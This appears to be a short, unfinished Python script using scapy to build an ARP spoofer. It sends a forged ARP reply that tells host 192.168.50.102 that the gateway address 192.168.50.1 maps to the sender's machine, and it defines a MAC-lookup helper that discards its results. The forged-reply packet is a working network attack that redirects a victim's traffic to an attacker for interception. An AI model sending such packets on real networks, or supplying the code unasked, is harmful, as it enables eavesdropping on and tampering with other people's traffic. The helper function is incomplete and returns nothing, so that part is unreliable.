# IMPORTS
import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.50.102", hwdst="00:0c:29:80:4e:40", psrc="192.168.50.1")
scapy.send(packet)

def getMac(ip):
    arp_request = scapy.ARP(pdst=ip)  # IP source
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # ARP destination
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    client_list = []

    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
        print("- - - - - - - - - - - ")
    return
